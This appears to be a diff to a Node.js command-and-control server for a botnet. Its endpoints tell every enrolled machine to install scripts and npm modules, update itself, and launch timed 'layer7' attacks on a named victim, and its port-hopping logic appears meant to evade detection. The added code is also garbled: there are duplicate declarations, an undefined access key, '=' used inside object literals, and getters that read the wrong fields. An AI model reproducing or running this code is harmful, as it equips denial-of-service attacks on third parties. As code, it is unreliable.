@@ -40,7 +40,6 @@ logger.init(initSign, "Called 'caller-id'")
 const bodyParser = require('body-parser');
 const si = require('systeminformation');
 
-let initLogID = crypto.randomBytes(5).toString('hex')
 let systemInfo = {
     static: null,
     dynamic: {
@@ -60,6 +59,146 @@ let systemInfo = {
         net: null
     }
 }
+
+let GLOBALS = {
+    port: {
+        number: null,
+        changeAt: null,
+        changedLast: null,
+        changeTo: null,
+        last: null
+    },
+    restart: {
+        scheduled: false,
+        at: null,
+        last: null
+    },
+    lockdown: true,
+    accessKey: foobar
+
+}
+
+
+let GLOBALS = {
+    port: {
+        number: null,
+        changeAt: null,
+        changedLast: null,
+        changeTo: null,
+        last: null
+    },
+    restart: {
+        scheduled: false,
+        at: null,
+        last: null
+    },
+    lockdown: true,
+    accessKey: foobar
+
+}
+
+
+
+let gfunc = {
+    whole = function () { return GLOBALS },
+    latestGlobalsWrite: null,
+    port: {
+        number: {
+            get = function (a) {
+                return (GLOBALS.port.number)
+            },
+            write = function (a) {
+                gfunc.latestGlobalsWrite = Date.now()
+                return (GLOBALS.port.number = a)
+            }
+        },
+        changeAt: {
+            get = function (a) {
+
+                return (GLOBALS.port.changeAt)
+            },
+            write = function (a) {
+                gfunc.latestGlobalsWrite = Date.now()
+                return (GLOBALS.port.changeAt = a)
+            }
+        },
+        changedLast: {
+            get = function (a) {
+                return (GLOBALS.port.changedLast)
+            },
+            write = function (a) {
+                gfunc.latestGlobalsWrite = Date.now()
+                return (GLOBALS.port.changedLast = a)
+            }
+        },
+        changeTo: {
+            get = function (a) {
+                return (GLOBALS.port.changeTo)
+            },
+            write = function (a) {
+                gfunc.latestGlobalsWrite = Date.now()
+                return (GLOBALS.port.changeTo = a)
+            }
+        },
+        last: {
+            get = function (a) {
+                return (GLOBALS.port.last)
+            },
+            write = function (a) {
+                gfunc.latestGlobalsWrite = Date.now()
+                return (GLOBALS.port.last = a)
+            }
+        }
+    },
+    restart: {
+        scheduled: {
+            get = function (a) {
+                return (GLOBALS.port.scheduled)
+            },
+            write = function (a) {
+                gfunc.latestGlobalsWrite = Date.now()
+                return (GLOBALS.port.scheduled = a)
+            }
+        },
+        at: {
+            get = function (a) {
+                return (GLOBALS.port.at)
+            },
+            write = function (a) {
+                gfunc.latestGlobalsWrite = Date.now()
+                return (GLOBALS.port.at = a)
+            }
+        },
+        last: {
+            get = function (a) {
+                return (GLOBALS.port.last)
+            },
+            write = function (a) {
+                gfunc.latestGlobalsWrite = Date.now()
+                return (GLOBALS.port.last = a)
+            }
+        }
+    },
+    lockdown: {
+        get = function (a) {
+            return (GLOBALS.port.lockdown)
+        },
+        write = function (a) {
+            gfunc.latestGlobalsWrite = Date.now()
+            return (GLOBALS.port.lockdown = a)
+        }
+    },
+    accessKey: {
+        get = function (a) {
+            return (GLOBALS.port.accessKey)
+        },
+        write = function (a) {
+            gfunc.latestGlobalsWrite = Date.now()
+            return (GLOBALS.port.accessKey = a)
+        }
+    },
+}
+
 si.getDynamicData(function (data) {
     systemInfo.dynamic.all = data
 })
@@ -69,10 +208,10 @@ let AGENTLINK = null
 let SERVICELINK = null
 let SERVICENAME = null
 let SCRIPTS = null
-let CURRENTPORT = null
 let activeMachinesList = []
 let activeMachinesList_inDB = []
-let GLOBALS = {}
+
+let MACHINES = []
 const dbok = new EventEmitter()
 
 function logID() {
@@ -291,7 +430,6 @@ app.get('/globals', (req, res) => {
 
     GLOBALS.port.leftForChange = ((GLOBALS.port.changeAt) - (Date.now()))
     GLOBALS.port.shouldChange = (GLOBALS.port.changeAt <= Date.now())
-    GLOBALS.port.shouldChange = (GLOBALS.port.changeAt <= Date.now())
     res.send(200, GLOBALS)
 })
 
@@ -346,8 +484,7 @@ app.patch('/heartbeat', (req, res) => {
 app.get('/all/installscript/:scriptid', (req, res) => {
     clen = activeMachinesList.length
     for (let index = 0; index < clen; index++) {
-        console.log(`Asking ${activeMachinesList[index]}:${CURRENTPORT}`);
-        axios.get(`http://${activeMachinesList[index]}:${CURRENTPORT}/installScript/${req.params.scriptid}`)
+        axios.get(`http://${activeMachinesList[index]}:${gfunc.port.number.get()}/installScript/${req.params.scriptid}`)
             .then(res => {
                 console.log(res.data)
             })
@@ -361,8 +498,7 @@ app.get('/all/installscript/:scriptid', (req, res) => {
 app.get('/all/npminstall/:module', (req, res) => {
     clen = activeMachinesList.length
     for (let index = 0; index < clen; index++) {
-        console.log(`Asking ${activeMachinesList[index]}:${CURRENTPORT}`);
-        axios.get(`http://${activeMachinesList[index]}:${CURRENTPORT}/npminstall/${req.params.module}`)
+        axios.get(`http://${activeMachinesList[index]}:${gfunc.port.number.get()}/npminstall/${req.params.module}`)
             .then(res => {
                 console.log(res.data)
             })
@@ -384,8 +520,8 @@ app.get('/all/attacklayer7/:methodID/:victim/:time/:attackID', async (req, res) 
     }
     for (let index = 0; index < clen; index++) {
         machines.asked.push(activeMachinesList[index])
-        console.log(`http://${activeMachinesList[index]}:${CURRENTPORT}/layer7/${req.params.methodID}/${req.params.victim}/${req.params.time}/${req.params.attackID}`);
-        axios.get(`http://${activeMachinesList[index]}:${CURRENTPORT}/layer7/${req.params.methodID}/${req.params.victim}/${req.params.time}/${req.params.attackID}`)
+        console.log(`http://${activeMachinesList[index]}:${gfunc.port.number.get()}/layer7/${req.params.methodID}/${req.params.victim}/${req.params.time}/${req.params.attackID}`);
+        axios.get(`http://${activeMachinesList[index]}:${gfunc.port.number.get()}/layer7/${req.params.methodID}/${req.params.victim}/${req.params.time}/${req.params.attackID}`)
             .then(res => {
                 console.log(res.data)
                 machines.responded.push(activeMachinesList[index])
@@ -402,8 +538,8 @@ app.get('/all/attacklayer7/:methodID/:victim/:time/:attackID', async (req, res) 
 app.get('/all/update', (req, res) => {
     clen = activeMachinesList.length
     for (let index = 0; index < clen; index++) {
-        console.log(`http://${activeMachinesList[index]}:${CURRENTPORT}/update`);
-        axios.get(`http://${activeMachinesList[index]}:${CURRENTPORT}/update`)
+        console.log(`http://${activeMachinesList[index]}:${gfunc.port.number.get()}/update`);
+        axios.get(`http://${activeMachinesList[index]}:${gfunc.port.number.get()}/update`)
             .then(res => {
                 console.log(res.data)
             })
@@ -440,8 +576,8 @@ app.get('/machines/testReachability/:timeout', async (req, res) => {
             timeout_ = parseInt(req.params.timeout)
     }
     for (let index = 0; index < clen; index++) {
-        console.log(`Asking ${activeMachinesList[index]}:${CURRENTPORT}`);
-        axios.get(`http://${activeMachinesList[index]}:${CURRENTPORT}/status`, {
+        console.log(`Asking ${activeMachinesList[index]}:${gfunc.port.number.get()}`);
+        axios.get(`http://${activeMachinesList[index]}:${gfunc.port.number.get()}/status`, {
             timeout: timeout_ * 1000,
         })
             .then(res => {
@@ -531,21 +667,10 @@ async function schedulePortChangeTest(secs, np, logid) {
     let inMinutes = secs || config.defaultPortReplenishTimeMin
     let newPort = np || await randomInt(1000, 9999)
     logger.info(logid, "Port change schedule requested.", `Scheduling change to port ${newPort} in ${inMinutes} minutes.`)
-    GLOBALS.port.changeAt = moment().add({ seconds: inMinutes }).unix() * 1000
-    GLOBALS.port.changeTo = newPort
-    GLOBALS.port.changedLast = Date.now()
-    axios.patch("http://localhost:3000/global", GLOBALS)
-        .then(res => {
-            logger.info(logid, "Port change schedule request.", `Successfuly scheduled to port ${newPort} in ${inMinutes} minutes..`)
-            //console.log(res)
-            globalLock = false;
-        })
-        .catch(err => {
-            logger.error(logid, "Port change schedule failed.", `${err.message}`)
-            dbok.emit('false')
-            globalLock = false;
-        })
-
+    gfunc.port.changeAt.write(moment().add({ seconds: inMinutes }).unix() * 1000)
+    gfunc.port.changeTo.write(newPort)
+    gfunc.port.changedLast.write(Date.now())
+    globalLock = false;
 }
 
 app.post('/mgmt/update', (req, res) => {
@@ -610,29 +735,13 @@ app.post('/mgmt/vcontrol', (req, res) => {
 })
 
 app.post('/mgmt/portElusion/', async (req, res) => {
-
     globalLock = true;
     let newPort = await randomInt(1000, 9999)
-    let currentPort = GLOBALS.port.number
-    console.log(GLOBALS);
-    GLOBALS.port.last = currentPort
-    console.log(GLOBALS);
-    GLOBALS.port.changedLast = Date.now()
-    console.log(GLOBALS);
-    GLOBALS.port.number = newPort
-    CURRENTPORT = newPort
-    console.log(GLOBALS);
-    axios.patch("http://localhost:3000/global", GLOBALS)
-        .then(res => {
-            //console.log(res)
-            schedulePortChange()
-            globalLock = false;
-        })
-        .catch(err => {
-            dbok.emit('false')
-            globalLock = false;
-        })
+    gfunc.port.last.write(gfunc.port.number.get())
+    gfunc.port.changedLast.write(Date.now())
+    gfunc.port.number.write(newPort)
     res.send(200)
+    globalLock = false;
 })
 
 app.listen(80, () => console.log(`App listening on port ${"80"}!`))
@@ -680,75 +789,22 @@ function initiate() {
         .catch(err => {
             console.error(err);
         })
-    globalLock = true;
-    axios.get("http://localhost:3000/global")
-        .then(res => {
-            CURRENTPORT = res.data.port.number
-            console.log("Current port loaded.");
-            if ((res.data).port.changeAt < moment().utc()) {
-                //console.log("Scheduling port change.");
-                console.log("Scheduled port change because of expired port on the database.");
-                schedulePortChange()
-            }
-            globalLock = false;
-        })
-        .catch(err => {
-            console.error(err);
-            globalLock = false;
-        })
-    updateMasterSubdomain()
-    function checkSelf() {
-        globalLock = true;
-        axios.get("http://localhost:3000/global")
-            .then(res => {
-                adaptPort()
-                globalLock = false;
 
-            })
-            .catch(err => {
-                globalLock = false;
-            })
+    if (gfunc.port.changeAt.get() < moment().utc()) {
+        console.log("Scheduled port change because of the expired port on the database.");
+        schedulePortChange()
     }
+    updateMasterSubdomain()
+
     async function adaptPort() {
         console.log("attempting");
-        if (GLOBALS.port.changeAt <= Date.now()) {
-            console.log("GEÇMİŞ AMINA KOYAYIM")
-            console.log(JSON.stringify(GLOBALS));
-            console.log(GLOBALS.port);
-            GLOBALS.port.last = GLOBALS.port.number
-            console.log(JSON.stringify(GLOBALS));
-            GLOBALS.port.number = GLOBALS.port.changeTo
-            console.log(JSON.stringify(GLOBALS));
-            CURRENTPORT = GLOBALS.port.changeTo
-            console.log(JSON.stringify(GLOBALS));
-            GLOBALS.port.changedLast = Date.now()
-            console.log(JSON.stringify(GLOBALS));
-            axios.patch("http://localhost:3000/global", GLOBALS)
-                .then(res => {
-                    refreshGlobals()
-                    schedulePortChange()
-                    console.log("repl");
-                    console.log(GLOBALS);
-                    globalLock = false;
-                })
-                .catch(err => {
-                    dbok.emit('false')
-                    console.log(err);
-                    globalLock = false;
-                })
+        if (gfunc.port.changeAt.get() <= Date.now()) {
+            gfunc.port.last.write(gfunc.port.number.get())
+            gfunc.port.number.write(gfunc.port.changeTo.get())
+            gfunc.port.changedLast.write(Date.now())
         }
     }
-    checkSelf();
-    refreshGlobals()
 
-    setInterval(function () {
-        checkSelf()
-        console.log("Self-check...");
-    }, 10000)
-
-    setInterval(function () {
-        refreshGlobals()
-    }, 5000)
 
     function refreshGlobals() {
         if (globalLock === false) {
@@ -812,19 +868,11 @@ function initiate() {
 async function changePort(newport, logid) {
     globalLock = true;
     logger.info(logid, "Changing port.", "Response for the current settings recieved.")
-    GLOBALS.port.number = parseInt(newport)
-    CURRENTPORT = parseInt(newport)
-    axios.patch("http://localhost:3000/global", GLOBALS)
-        .then(res => {
-            logger.info(logid, "Changed port.", `Successfuly switched to port ${res.data.port.number}.`)
-            //console.log(res)
-            globalLock = false;
-        })
-        .catch(err => {
-            logger.error(logid, "Couldn't change port. Patch failed.", `${err.message}`)
-            dbok.emit('false')
-            globalLock = false;
-        })
+    gfunc.port.last.write(gfunc.port.number.get())
+    gfunc.port.number.write(newport)
+    gfunc.port.changedLast.write(Date.now())
+    logger.info(logid, "Changed port.", `Successfuly switched to port ${gfunc.port.number.get()}.`)
+    globalLock = false;
 }
 
 async function schedulePortChange(mins, np, logid) {
@@ -832,28 +880,14 @@ async function schedulePortChange(mins, np, logid) {
     let inMinutes = mins || config.defaultPortReplenishTimeMin
     let newPort = np || await randomInt(1000, 9999)
     logger.info(logid, "Port change schedule requested.", `Scheduling change to port ${newPort} in ${inMinutes} minutes.`)
-    GLOBALS.port.changeAt = moment().add({ minutes: inMinutes }).unix() * 1000
-    GLOBALS.port.changeTo = newPort
-    axios.patch("http://localhost:3000/global", GLOBALS)
-        .then(res => {
-            logger.info(logid, "Port change schedule request.", `Successfuly scheduled to port ${newPort} in ${inMinutes} minutes..`)
-            //console.log(res)
-            globalLock = false;
-        })
-        .catch(err => {
-            logger.error(logid, "Port change schedule failed.", `${err.message}`)
-            dbok.emit('false')
-            globalLock = false;
-        })
+    gfunc.port.changeAt.write(moment().add({ minutes: inMinutes }).unix() * 1000)
+    gfunc.port.changeTo.write(newPort)
+    logger.info(logid, "Port change schedule request.", `Successfuly scheduled to port ${newPort} in ${inMinutes} minutes..`)
+    globalLock = false;
+
 
 }
 
 //clock()
 
-async function clock() {
-    let freq = config.clockclock
-    while (true) {
-        await delay(freq)
-    }
-}
 
